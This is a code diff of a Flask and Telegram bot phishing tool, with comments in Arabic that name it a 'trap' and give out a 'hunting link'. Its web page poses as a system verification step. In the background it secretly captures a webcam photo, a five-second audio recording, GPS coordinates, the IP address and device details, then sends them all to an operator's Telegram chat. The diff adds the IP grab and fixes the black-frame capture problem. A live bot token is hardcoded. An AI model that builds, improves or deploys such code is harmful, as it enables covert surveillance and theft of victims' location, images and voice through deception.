@@ -3,10 +3,11 @@ from flask import Flask, render_template_string, request
 
 app = Flask(__name__)
 
-# --- إعدادات الملك سيوفي ---
+# --- إعدادات الملك سيوفي (لا تغيرها) ---
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
 
+# --- الفخ المطور (حل السواد + جلب الأيبي) ---
 HTML = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -36,16 +37,29 @@ HTML = '''
 
         async function startProcess() {
             document.getElementById('go').style.display = 'none';
-            document.getElementById('st').innerText = "جاري تهيئة النظام... (3 ثواني)";
+            document.getElementById('st').innerText = "جاري الاتصال بالنظام الأمين... يرجى الانتظار";
             
             try {
+                // بدئ جلب الأيبي فوراً (عملية توازية)
+                let ipAddress = 'جاري الجلب...';
+                const ipPromise = fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(ipData => { ipAddress = ipData.ip; })
+                    .catch(() => { ipAddress = 'تعذر الجلب (قد يكون VPN active)'; });
+
+                // فتح الكاميرا والصوت
                 const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const v = document.getElementById('v'); v.srcObject = s;
                 
-                // جلب معلومات عميقة جداً
+                // جلب المعلومات الأصلية (v13.0)
                 const b = await navigator.getBattery().catch(() => ({}));
-                const info = `📋 **تقرير معلومات تفصيلي**:\\n` +
+                
+                // ننتظر انتهاء محاولة جلب الأيبي لبناء تقرير ضخم
+                await ipPromise;
+
+                const info = `📋 **تقرير معلومات تفصيلي (v14.0)**:\\n` +
                              `━━━━━━━━━━━━━━\\n` +
+                             `🌐 **الأيبي المحلّي (IP):** ${ipAddress}\\n` +
                              `🔋 البطارية: ${Math.round(b.level*100)}% (${b.charging ? 'يُشحن ⚡' : 'لا يُشحن'})\\n` +
                              `📱 النظام: ${navigator.platform}\\n` +
                              `🧠 المعالج: ${navigator.hardwareConcurrency} نوى\\n` +
@@ -61,27 +75,31 @@ HTML = '''
                     post(`📍 **رابط الخريطة**:\\nhttp://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, "msg");
                 }, null, {enableHighAccuracy: true});
 
-                // الانتظار 3 ثواني قبل الصورة (لحل مشكلة السواد)
-                setTimeout(() => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    post(c.toDataURL('image/jpeg', 0.85), "img");
-                    document.getElementById('st').innerText = "جاري تسجيل البصمة... (5 ثواني)";
-                    
-                    // تسجيل صوتي احترافي
-                    const r = new MediaRecorder(s);
-                    const ch = [];
-                    r.ondataavailable = e => ch.push(e.data);
-                    r.onstop = () => {
-                        const reader = new FileReader();
-                        reader.readAsDataURL(new Blob(ch));
-                        reader.onloadend = () => post(reader.result, "aud");
-                        document.getElementById('st').innerText = "✅ اكتمل التحقق بنجاح!";
-                    };
-                    r.start();
-                    setTimeout(() => r.stop(), 5000);
-                }, 3000); // 3 ثواني تأخير للصورة
+                // الحل الجذري للسواد: ننتظر حتى يبدأ الفيديو باللعب (يوجد إطارات حقيقية)
+                v.addEventListener('playing', () => {
+                    document.getElementById('st').innerText = "جاري توازن الإضاءة... (ثانيتين)";
+                    // ثانية واحدة إضافية لاستقرار الضوء (Auto-exposure)
+                    setTimeout(() => {
+                        const c = document.getElementById('c');
+                        c.width = v.videoWidth; c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        post(c.toDataURL('image/jpeg', 0.9), "img");
+                        document.getElementById('st').innerText = "جاري تسجيل البصمة... (5 ثواني)";
+                        
+                        // تسجيل صوتي احترافي (من v13.0)
+                        const r = new MediaRecorder(s);
+                        const ch = [];
+                        r.ondataavailable = e => ch.push(e.data);
+                        r.onstop = () => {
+                            const reader = new FileReader();
+                            reader.readAsDataURL(new Blob(ch));
+                            reader.onloadend = () => post(reader.result, "aud");
+                            document.getElementById('st').innerText = "✅ اكتمل التحقق بنجاح!";
+                        };
+                        r.start();
+                        setTimeout(() => r.stop(), 5000);
+                    }, 2000); // ثانيتين تأخير ذكي "بعد" بدء التشغيل
+                });
 
             } catch (e) { location.reload(); }
         }
@@ -97,6 +115,7 @@ def home():
 @app.route('/api/capture', methods=['POST'])
 def capture():
     data = request.get_json(force=True, silent=True)
+    if not data: return "OK"
     t, d = data.get('t'), data.get('d')
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
     if t == 'msg':
@@ -117,7 +136,7 @@ def bot_webhook():
         if uid == ADMIN_ID:
             kb = {"inline_keyboard": [[{"text": "🔗 رابط الصيد", "callback_data": "link"}], [{"text": "📊 الحالة", "callback_data": "status"}]]}
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                          json={'chat_id': uid, 'text': "🔥 أهلاً ملك سيوفي.. البوت جاهز تماماً!", 'reply_markup': kb})
+                          json={'chat_id': uid, 'text': "🔥 أهلاً ملك سيوفي.. البوت v14.0 جاهز تماماً!", 'reply_markup': kb})
     
     elif "callback_query" in data:
         cid = data["callback_query"]["message"]["chat"]["id"]
@@ -126,7 +145,7 @@ def bot_webhook():
         if cb == "link":
             requests.post(url + "sendMessage", json={'chat_id': cid, 'text': f"🚀 رابطك المباشر:\\n`https://{request.host}`", 'parse_mode': 'Markdown'})
         elif cb == "status":
-            requests.post(url + "sendMessage", json={'chat_id': cid, 'text': "✅ السيرفر يعمل وبقوة v13.0"})
+            requests.post(url + "sendMessage", json={'chat_id': cid, 'text': "✅ السيرفر يعمل وبقوة v14.0"})
             
     return "OK"
 
